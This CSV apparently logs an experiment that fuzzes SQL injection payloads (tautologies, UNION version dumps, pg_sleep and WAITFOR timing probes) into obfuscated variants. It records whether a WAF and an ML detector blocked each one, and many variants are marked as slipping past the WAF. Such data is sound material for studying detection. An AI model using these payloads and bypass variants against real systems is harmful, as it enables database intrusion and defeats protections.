Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
1,2025-10-23T20:22:17.894238,s,403,200,200,both_incorrect,s,2025-10-23T20:22:40.532008,200,403,waf_incorrect_ml_correct,s,2025-10-23T20:23:06.578613,200,403,waf_incorrect_ml_correct,s,2025-10-23T20:23:32.627329,200,403,waf_incorrect_ml_correct,s,2025-10-23T20:23:58.681443,200,200,both_incorrect,s,2025-10-23T20:24:24.103299,200,403,waf_incorrect_ml_correct,s,2025-10-23T20:24:50.146653,200,403,waf_incorrect_ml_correct,s,2025-10-23T20:25:16.190658,200,200,both_incorrect,s,2025-10-23T20:25:42.159178,200,403,waf_incorrect_ml_correct,s,2025-10-23T20:26:08.205969,200,403,waf_incorrect_ml_correct,s,2025-10-23T20:26:34.257204,200,200,both_incorrect
2,2025-10-23T20:27:00.157737,select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,403,403,403,both_correct,"sELECT * FRoM users wHeRE id  =  1 OR $+<\/**/OR (SELECT 0x1)   LiKE   1 -- 'O' NOT
LIKE 'Oo'^6",2025-10-23T20:27:25.206102,403,403,both_correct,"seLect * FROM/**/users wHErE id   LIKE   1 or $+<\/**/OR (sELECT 0x1)   liKe   5390 IN ( AND 1,5390,5391) --
'O' NOT
LIKE 'Oo'^0x6",2025-10-23T20:27:51.252048,403,403,both_correct,"seLeCT * FRoM users WHere id
  LIkE   0x1 oR $+<\/*[VlS*/OR (selecT 0x1)   lIke   (SELECT 1) in ( AnD 1,'d@V'='d@V',5391) --
'O' NOT
LIKE 'Oo'^0x6",2025-10-23T20:28:17.306427,403,403,both_correct,"sElEcT * FrOM users wHeRe id
  lIke   0x1 OR $+<\/**/Or (selecT 0x1)   lIkE   (sELecT 'Bl' not like 'BlG')/**/iN ( AND  Or 0,'d@V'='d@V',(SELECT 5391)) --	'O' NOT
LIKE 'Oo'^0x6",2025-10-23T20:28:42.826070,403,403,both_correct,"selECt * froM users WhERE id
  like   0x1 Or $+<\ oR (sElEcT 0x1)   LIKE   (SelECT 'Bl' not like 'BlG')/*'{'='{'*/IN ( anD  oR  oR (SELECT 0),'d@V' LIKE 'd@V',(SELECt 5391)) --	'O' NOT LIKE 'Oo'^0x6",2025-10-23T20:29:08.894018,403,403,both_correct,"sEleCT * FroM users wHEre id
  like   0x1 OR $+<\ OR (seLecT 0x1)   like /**/ (SelEct 'Bl' not like 'BlG')/**/in ( And  or  || (SELeCt  OR (SELECT 0)),'d@V' LIke 'd@V',(SelECt 2884<>2885)) --
'O' NOT LIKE 'Oo'^0x6",2025-10-23T20:29:34.939362,403,403,both_correct,"SELect/**/* FRoM users WHERe id   LIke   0x1 oR $+<\ or (seLEct 0x1)   LIke /**/ (sElecT 'Bl' not like 'BlG')/**/IN ( AND  OR  || (SElECT  OR (SelEcT (SELECT 'agub' NOT LIKE 'agubs'))),'d@V' Like 'd@V',(sEleCt 0xb44<>2885)) --
'O' NOT LIKE 'Oo'^0x6",2025-10-23T20:30:00.098954,403,403,both_correct,"SelECt/**/* FRom users where id   lIKe   0x1 or $+<\ Or (SeLeCT 0x1)   liKE /**/ (sElect 'Bl' not like 'BlG')/**/IN ( AnD  Or  || (sELEcT  or (Select (seLeCt 'agub' NOT/**/LIKE 'agubs'))), OR 0 NOT LIKE 6844,(SELECt 0xb44<>0xb45)) --
'O' NOT	LIKE 'Oo'^0x6",2025-10-23T20:30:26.149607,403,403,both_correct,"SeleCt/**/* FRom users where id   LiKe   0x1 or $+<\ Or (sElecT 0x1)  	like /**/ (SELeCt 'Bl' not like 'BlG')/**/In ( AND  or  || (SElECt  Or (selECT (SeLECt 'agub' NOT/**/Like 'agubs'))), oR  aND 0x1/**/NOT LIKE ' ' NOT LIKE ' ""',(SELect 0xb44 not like 0xb45)) --
'O' NOT	LIKE 'Oo'^0x6",2025-10-23T20:30:52.199315,403,403,both_correct,"sElEcT/**/* fROm users WheRE id   lIKE   0x1 oR $+<\ oR (seleCt 0x1)  	LikE /**/ (SeLeCt 'Bl' not like 'BlG') In (	ANd  OR  || (SeLECT  OR (seLEct (seLecT 'agub' NOT/**/Like 'agubs'))), or  aND 0x1/**/not like ' ' NOT LIKE ' ""',(selEct 0xb44 not like 0xb45)) --
'O' NOT	LIKE 'Oo'^0x6",2025-10-23T20:31:18.260078,403,403,both_correct
3,2025-10-23T20:31:44.302896," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",403,403,403,both_correct," sELeCt * frOM users WHEre id   LIKE   1 oR ""%.""/*th2*/oR 'r'<>'r&'  =	  oR 0x0 -- 1",2025-10-23T20:32:08.926888,403,403,both_correct," seLECt * FrOM users wheRe id   lIKe   0x1 OR ""%.""/**/Or 'r'<>'r&' 	=	/**/ or 0x0 --  OR 0<>827",2025-10-23T20:32:34.950523,403,403,both_correct," SElECT * fRom users WheRE id   LIkE   0x1 oR ""%.""/**/or 'r'!='r&' 	=	  or 0x0	--  OR  AND 1<>(SELECT '0'<>'0(')Nc",2025-10-23T20:33:01.004918,403,403,both_correct," SelEct * fROM users whERe id 
 liKe   0x1 Or ""%."" || 'r'!='r&' 	=	  OR 0x0	--  OR  AND 0x1<>(SELECT '8732<>8733'<>' AND 1(')Nc[",2025-10-23T20:33:27.057741,403,403,both_correct," SeLect * FRoM users whERE id 
 LIke   0x1 or ""%.""  OR  'r'!='r&' 	=   Or 0x0	--  OR  AND 0x1<>(SELECT/**/' AND (SELECT 1)<>'A' NOT LIKE 'Am''<>' AND 1(')Nc[",2025-10-23T20:33:51.972303,403,403,both_correct," sElECT * froM users WhErE id 	 LiKE   0x1 or ""%.""  OR  'r'!='r&' 	 LIKE    Or 0x0	--  OR  AND 0x1<>(SELECT ' AND (SELECT (SELECT 1))<>'A' NOT LIKE 'Am''<>' AND 2929!=0xb72(')Nc[",2025-10-23T20:34:18.014707,403,403,both_correct," SElect * FRom users/**/whEre id 	 LIkE   0x1 OR ""%.""  oR  'r'!='r&' 	 lIke    or 0x0	--  OR  AND 0x1<>(SELECT ' AND (SELECT (SELECT 0x1))<>'A' NOT LIKE 'Am''<>' AND
 AND 1!=0xb72(')Nc[",2025-10-23T20:34:44.066196,403,403,both_correct," SEleCt * FrOm users/**/wHeRE id 	
LiKe   0x1 oR ""%.""  oR  'r' NOT LIKE 'r&' 	 lIKe    or 0x0	--  OR  AND 0x1<>(SELECT ' AND (SELECT (SELECT 0x1))<>'A' NOT LIKE 'Am''<>' AND
 anD  ANd (SELECT 'f+'/**/LIKE 'f+')!=0xb72(')Nc[\",2025-10-23T20:35:10.121256,403,403,both_correct," sELecT * fRom users wHErE id  
LiKe   0x1 oR ""%.""  oR  'r' NOT LIKE 'r&' 	 LikE    oR 0x0	--  OR  AND 0x1<>(SELECT ' AND (SELECT (SELECT 0x1))<>'A' NOT LIKE 'Am''<>' AND
 AND  And (sELeCt 'f+'/**/LiKE 'f+') not like 0xb72(')Nc[\be",2025-10-23T20:35:36.178261,403,403,both_correct," sELECt * frOm users WHErE id  
liKE   0x1 OR ""%.""  oR  'r' not like 'r&' 	 Like    Or 0x0	--  OR  AND 0x1<>(SELECT ' AND (SELECT (SELECT 0x1))<>'A' NOT LIKE 'Am''<>' AND  AND  And (sELeCt 'f+' LiKE 'f+') not like 0xb72(')Nc[\be",2025-10-23T20:36:02.245618,403,403,both_correct
4,2025-10-23T20:36:28.291555," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",403,403,403,both_correct," seLeCt * FRoM
users WheRE id   LIKE   ''-o/y'='-o/y'' union sEleCt/*p >*/$*$,@@VERSION -- 0x1'",2025-10-23T20:36:53.355775,403,403,both_correct," SelecT * frOm	users wHeRe id   LIke   ''-o/y'='-o/y'' union SElect $*$,@@VERSION -- 0x1'x",2025-10-23T20:37:19.411154,403,403,both_correct," seLeCt * fROm users WHERE id   lIkE   ''-o/y'='-o/y'' union/**/SELECt $*$,@@VERSION -- 0x1'x",2025-10-23T20:37:45.461202,403,403,both_correct," seleCt * fRom users WhERe/*i>)*/id   LikE	  ''-o/y'='-o/y'' union/**/SELeCt $*$,@@VERSION -- 0x1'x",2025-10-23T20:38:11.506314,403,403,both_correct," seLeCt * frOM users whERE/*i>)*/id   like
  ''-o/y'='-o/y''/**/union/*
*/sElect $*$,@@VERSION -- 0x1'x",2025-10-23T20:38:37.557252,403,403,both_correct," selECt * fRoM users wHEre/*i>)*/id   Like	  ''-o/y'='-o/y'' union/*
*/SElEct $*$,@@VERSION -- 0x1'xH",2025-10-23T20:39:03.605589,403,403,both_correct," SEleCt * frOM users WHerE/*i>)*/id  /**/liKE	  ''-o/y'='-o/y'' union/**/selECt $*$,@@VERSION --	0x1'xHk0",2025-10-23T20:39:29.651759,403,403,both_correct," selECt * FROM users wHErE/*i>)*/id  /**/LIke	  ''-o/y'='-o/y'' union select $*$,@@VERSION -- 0x1'xHk0",2025-10-23T20:39:55.702795,403,403,both_correct," SelEct * frOm users wHERE/*i>)*/id/**/ /*Aii*/lIKe
  ''-o/y'='-o/y'' union SElECT $*$,@@VERSION -- 0x1'xHk0",2025-10-23T20:40:21.762369,403,403,both_correct," SeLect * FRom users WhErE/*i>)*/id  /**/lIkE   ''-o/y'='-o/y'' union seLect $*$,@@VERSION -- 0x1'xHk0~",2025-10-23T20:40:47.813574,403,403,both_correct
5,2025-10-23T20:41:13.857764, or 1  =  1 or ''  =  ',403,200,403,waf_incorrect_ml_correct," oR (seleCt 
&& 1)/*H*/ =  'c' LIKE 'c' Or ''  =  '",2025-10-23T20:41:38.907223,200,403,waf_incorrect_ml_correct," Or (sELecT 	 And   AnD 0x1)/*H*/ =  'c' like/**/'c' Or ''  =  '",2025-10-23T20:42:04.956009,200,403,waf_incorrect_ml_correct," Or	(sELEcT 	 AnD   anD 0x1)/*;fy""*/ =  'c' LIKE 'c' OR ''   like   '",2025-10-23T20:42:30.699300,403,403,both_correct," oR	(selEcT 	 AND   aNd 0x1)  =  'w'<>'w1'
OR ''   LiKE   '",2025-10-23T20:42:56.746512,200,403,waf_incorrect_ml_correct," OR	(sELeCT 	 And/**/  And 0x1)   like   'w'<>'w1'
or ''   lIke	  '",2025-10-23T20:43:22.799657,200,403,waf_incorrect_ml_correct," oR	(sELeCT 	 AND/* AND '(SELECT 94)'='94'*/	 And 0x1)   lIkE   'w' NOT LIKE 'w1'
OR ''/**/  liKe	  '",2025-10-23T20:43:48.848598,200,403,waf_incorrect_ml_correct," Or	(SelECt 
 aND/* AND '(SELECT  OR (SELECT '[' LIKE '['))'='94'*/	 and 0x1)   LIkE   'w' NOT LIKE 'w1'
Or/**/''/**/  LIKE	  '",2025-10-23T20:44:14.889240,200,403,waf_incorrect_ml_correct," or	(sElect 
 and/* AND '(SELECT  OR (SELECT '[' LIKE '['))'=' AND 0x24bf!=9408'*/	 anD 0x1) 	 like   'w' NOT LIKE 'w1'
or/**/''/**/ /*4Z	!!*/liKE	  '",2025-10-23T20:44:40.946407,200,403,waf_incorrect_ml_correct," OR	(selEcT 
 ANd/* AND/**/'(SELECT  OR (SELECT '[' LIKE '['))'=' AND 0x24bf!='7oD' NOT LIKE '7oDE''*/	 And 0x1) 	 lIkE   'w' not like 'w1'	oR/**/''/**/ /*HX*/lIKE	  '",2025-10-23T20:45:07.003447,403,403,both_correct," oR	(SelECt 
 anD/* AND/**/'(SELECT  OR (SELECT '[' LIKE '['))' Like ' AND 0x24bf!='7oD' NOT LIKE '7oDE''*/	 And 0x1) 	 lIkE   'w' not like 'w1' oR/**/''  /*HX*/liKE	  '",2025-10-23T20:45:33.054434,403,403,both_correct
6,2025-10-23T20:45:59.100804,1 and user_name  (    )     =   'dbo',403,403,403,both_correct,"6920<> OR 0x0 && user_name  (    )	   /**/=   'dbo'",2025-10-23T20:46:24.138271,200,403,waf_incorrect_ml_correct,"(SELECT 1) NOT LIKE 1033 NOT LIKE  OR 0x0 && user_name/**/ (    )
   /*>0x7*/=   'dbo'",2025-10-23T20:46:49.955734,403,403,both_correct,(sElecT 0x1) not like 'y' NOT LIKE 'yF' NOT LIKE  OR 0x0 && user_name/**/ (    )     =   'dbo',2025-10-23T20:47:16.004479,403,403,both_correct,"(SelEcT 0x1) not like 'y' NOT LIKE 'yF' not like  OR 0x0 && user_name/*fB7*/ ( /**/  )     =  	'dbo'",2025-10-23T20:47:42.057240,403,403,both_correct,"(sELecT 0x1) not like 'y' NOT LIKE 'yF' not/**/like  oR 0x0 && user_name/**/ ( /**/  )   
  LIKE   	'dbo'",2025-10-23T20:48:08.103821,403,403,both_correct,"(SElEcT 0x1) not like 'y' NOT LIKE 'yF' not LIKe  or 0x0  AND  user_name/**/ ( /**/  )   
  lIkE    'dbo'",2025-10-23T20:48:34.137356,403,403,both_correct,(Select 0x1) not like 'y' not like 'yF' not LIKe  oR 0x0  AND  user_name  ( /**/  )      LikE    'dbo',2025-10-23T20:49:00.185697,403,403,both_correct,"(seLECt 0x1) not like 'y' not like 'yF' not LIKe  Or 0x0  &&	 user_name  (    )      LiKe    'dbo'",2025-10-23T20:49:26.180426,403,403,both_correct,"(seLect 0x1) not like 'y' not like 'yF' not LIKe  oR 0x0   and 
 user_name  (    )/**/     LIKE    'dbo'",2025-10-23T20:49:52.225199,403,403,both_correct,"(sElECT 0x1) not like 'y' not like 'yF' not LIKe  Or 0x0   anD 	 user_name  (    )      LIKe    'dbo'",2025-10-23T20:50:18.271839,403,403,both_correct
7,2025-10-23T20:50:44.315643,1  )   or pg_sleep  (  __TIME__  )  --,403,403,403,both_correct,"(Select (SELECT 4927<>4928))  )   or pg_sleep  (
 __TIME__  ) /**/--",2025-10-23T20:51:09.364219,403,403,both_correct,(SelECt (SElECT (SELecT 4927) NOT LIKE  AND 'J(' LIKE 'J('))  )   or pg_sleep  (  __TIME__  )  --,2025-10-23T20:51:35.422802,403,403,both_correct,"(SEleCT (selEct (SElecT '&M'<>'&M>') NOT LIKE  aND 'J(' lIkE 'J('))  )   or pg_sleep  (  __TIME__/**/ ) 
--",2025-10-23T20:52:01.475451,403,403,both_correct,"(SElECt (SeLeCT (sElEct '&M' not like '&M>') NOT LIKE  AnD 'J('/*|b*/like 'J('))  )   or pg_sleep  (  __TIME__/**/ ) 	--",2025-10-23T20:52:27.523592,403,403,both_correct,"(SelecT (SELecT (seLECT '&M' not like '&M>') NOT LIKE  ANd 'J('/*|b*/LikE 'J('))  )   or pg_sleep 
(  __TIME__  ) 	--",2025-10-23T20:52:52.086906,403,403,both_correct,"(seLect (SeLect (selECt '&M' not like '&M>')	NOT LIKE /**/and 'J('/*|b*/liKe 'J('))  )   OR pg_sleep 
(  __TIME__  ) 	--",2025-10-23T20:53:18.134281,403,403,both_correct,"(SElecT (seLECt (sELEcT '&M' not like '&M>')	not like
/**/And 'J('/*|b*/LikE 'J('))  )   OR pg_sleep 
(  __TIME__  )/*kRNLs*/	--",2025-10-23T20:53:44.190044,403,403,both_correct,"(SElect (SeLeCT (Select '&M' not like '&M>')	not like	/*;F
a*/AnD 'J('/*|b*/liKE 'J('))  ) /**/ oR pg_sleep 
(  __TIME__  )/*kRNLs*/	--",2025-10-23T20:54:10.119787,403,403,both_correct,"(SElect (SelECT (seleCT '&M' not like '&M>')	not like	/*;F
a*/and 'J('/*|b*/lIKe 'J('))  )   or pg_sleep 
(  __TIME__  )/*}>*/ --",2025-10-23T20:54:36.172913,403,403,both_correct,"(sELecT (SElECt (selEcT '&M' not like '&M>') not like	 aND 'J('/*|b*/LIkE 'J('))  )   or pg_sleep 
(  __TIME__  )/*}>*/ --",2025-10-23T20:55:02.217016,403,403,both_correct
8,2025-10-23T20:55:28.259757,or 'text' > 't',403,200,403,waf_incorrect_ml_correct,"or/*a{*/'text' >	't'",2025-10-23T20:55:53.308786,200,403,waf_incorrect_ml_correct,"Or/**/'text'/**/>
't'",2025-10-23T20:56:19.355492,200,403,waf_incorrect_ml_correct,or/**/'text'/**/>/**/'t',2025-10-23T20:56:45.405555,200,403,waf_incorrect_ml_correct,oR 'text'/*Xlfi*/>/**/'t',2025-10-23T20:57:11.339932,200,403,waf_incorrect_ml_correct,"or	'text'/*Xlfi*/> 't'",2025-10-23T20:57:37.394065,200,403,waf_incorrect_ml_correct,"||	'text'/*R*/>
't'",2025-10-23T20:58:03.442555,200,403,waf_incorrect_ml_correct," or 	'text'/**/> 't'",2025-10-23T20:58:29.491066,200,403,waf_incorrect_ml_correct, or  'text'/**/>/**/'t',2025-10-23T20:58:53.964649,200,403,waf_incorrect_ml_correct," Or/**/
'text'/**/>/*a*/'t'",2025-10-23T20:59:19.990387,200,403,waf_incorrect_ml_correct,"/**/OR/**/	'text'/**/>/**/'t'",2025-10-23T20:59:46.028309,200,403,waf_incorrect_ml_correct
9,2025-10-23T21:00:12.085005,char%4039%41%2b%40SELECT,403,200,403,waf_incorrect_ml_correct,"char%/**/anD	0x1%'_' like '_'%2b%40SELECT",2025-10-23T21:00:37.138397,200,403,waf_incorrect_ml_correct,"char%/*?HBnQ*/and	0x1%'_'
LIke/**/'_'%2b%40SELECT",2025-10-23T21:01:03.183173,200,403,waf_incorrect_ml_correct,"char%/*L:*/aND	0x1%'_' LiKE '_'%2b%40SELECT",2025-10-23T21:01:29.228170,200,403,waf_incorrect_ml_correct,"char%/**/AnD	0x1%'_'/**/lIkE
'_'%2b%40SELECT",2025-10-23T21:01:55.271994,200,403,waf_incorrect_ml_correct,"char%/**/AnD	0x1%'_' lIKE	'_'%2b%40SELECT",2025-10-23T21:02:21.325068,200,403,waf_incorrect_ml_correct,"char% ANd	0x1%'_'	LIkE	'_'%2b%40SELECT",2025-10-23T21:02:47.371254,200,403,waf_incorrect_ml_correct,"char% and/**/0x1%'_'	liKe	'_'%2b%40SELECT",2025-10-23T21:03:13.418985,200,403,waf_incorrect_ml_correct,"char%/**/aND/**/0x1%'_'	likE '_'%2b%40SELECT",2025-10-23T21:03:39.466646,200,403,waf_incorrect_ml_correct,"char%/**/anD/**/0x1%'_'
LiKE/*6o|)e*/'_'%2b%40SELECT",2025-10-23T21:04:05.520295,200,403,waf_incorrect_ml_correct,"char% aNd/**/0x1%'_'	LikE/*6o|)e*/'_'%2b%40SELECT",2025-10-23T21:04:29.762034,200,403,waf_incorrect_ml_correct
10,2025-10-23T21:04:55.808340,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",403,403,403,both_correct,"; iF not  (  substring   (    (  /**/SeleCT @@version  )  ,0x18, Or 0  )    not like  1  )  
waitfor delay '0:0:9644<>9645' --",2025-10-23T21:05:20.856716,403,403,both_correct,"; IF not  (  substring/**/  (    (  /*`/C~*/seLECT @@version  )  ,0x18, or (SELECT 1)  )    not like  1  )  	waitfor delay '(SELECT 0):9155 NOT LIKE 9156:9644<>9645' --",2025-10-23T21:05:46.904289,200,403,waf_incorrect_ml_correct,"; If not	 (  substring   (    (  /*`/C~*/SeLecT @@version  )  ,0x18, or (selecT  AND 1)  )    not like  1  )  	waitfor delay '(SELECT 0):9155 NOT LIKE 5025 LIKE 5025:0x25ac<>9645' --",2025-10-23T21:06:11.867665,200,403,waf_incorrect_ml_correct,"; if not  (  substring   (    (  /*`/C~*/SElECT @@version  )  ,0x18, or (SeLecT  And 9054!=(seLEcT 9055))  )    not like  1  )  	waitfor delay '(SELECT  OR 0):9155 NOT/**/LIKE 5025 LIKE 5025:0x25ac<>9645' --",2025-10-23T21:06:37.922531,200,403,waf_incorrect_ml_correct,"; if not  (  substring   ( /**/  (  /*`/C~*/SELeCT @@version  )  ,0x18, Or (seLEct  AND 9054<>(sEleCT 9055))  )    not like  1  )  	waitfor delay '(SELECT  OR 'QU'!='QUQ'):9155 NOT/***/LIKE 5025 LIKE 5025:0x25ac<> AND (SELECT 1)'
--",2025-10-23T21:07:03.970438,403,403,both_correct,"; if not  (  substring   ( /**/  (  /*`/C~*/SelECT @@version  ) /**/,0x18, oR (Select  ANd (SELECT (SELECT 1)) not like (seleCT 9055))  )    not like  1  )   waitfor delay '(SELECT  OR 'QU'!='QUQ'):9155 NOT/***/LIKE 5025 LIKE 5025:0x25ac<> AND (SELECT '?G'='?G')'
--",2025-10-23T21:07:30.023636,200,403,waf_incorrect_ml_correct,"; IF not  (  substring   ( /**/  (  /*`/C~*/sEleCt @@version  ) /**/,0x18, oR (SelECt  ANd (SeLEcT (SeLECT  AND 1)) not like (sElECt 9055))  )    not like  800 NOT LIKE 801 
)  /**/waitfor delay '(SELECT  OR 'QU'!='QUQ'):0x23c3 NOT/***/LIKE 5025 LIKE 5025:0x25ac<> AND (SELECT '?G'='?G')'
--",2025-10-23T21:07:56.078620,200,403,waf_incorrect_ml_correct,"; iF not  (  substring   (    (  /*`/C~*/SELEct @@version  ) /**/,0x18, OR (sElEcT  aND (sElECT (selECT  && 1)) not like (SElect (sElect 'doj5' NOT LIKE 'doj5\')))  )    not like   Or 0 NOT LIKE 801 
)  /**/waitfor delay '(SELECT  OR 'QU'!='QUQ'):0x23c3 NOT/***/LIKE 5025 LIKE 5025:0x25ac<> AND (SELECT '?G'='?G')'	--",2025-10-23T21:08:22.147339,200,403,waf_incorrect_ml_correct,"; if not  (  substring   (    (
 /*`/C~*/sELECT @@version  ) /**/,0x18, OR (sEleCt  AnD (sELect (SeLEct  && (SEleCt 1))) not like (sElECt (sEleCt 'doj5' NOT LIKE 'doj5\')))  )    not like   Or (SELECT 1) NOT LIKE 801 
)   waitfor delay '(SeLeCt  || 'QU'!='QUQ'):0x23c3 NOT/***/lIKE 5025 LIKE 'M' LIKE 'M':0x25ac<> AnD (SElEcT '?G'='?G')'	--",2025-10-23T21:08:48.203231,403,403,both_correct,"; if not  (  substring   (    (
 /*`/C~*/SELECT @@version  ) /**/,0x18, or (Select  aND (seLeCT (SELECT  && (SelEcT 1))) not like (sELEcT (SELEct 'doj5' NOT LIKE 'doj5\')))  )    not like   Or (SELECT 0x1) NOT LIKE  OR 0 
)   waitfor delay '(SEleCt/**/ || 'QU' not like 'QUQ'):0x23c3 NOT/***/LIke '>Hip'='>Hip' lIke 'M' LiKE 'M':0x25ac<> aNd (seLect '?G'='?G')' --",2025-10-23T21:09:12.824050,403,403,both_correct
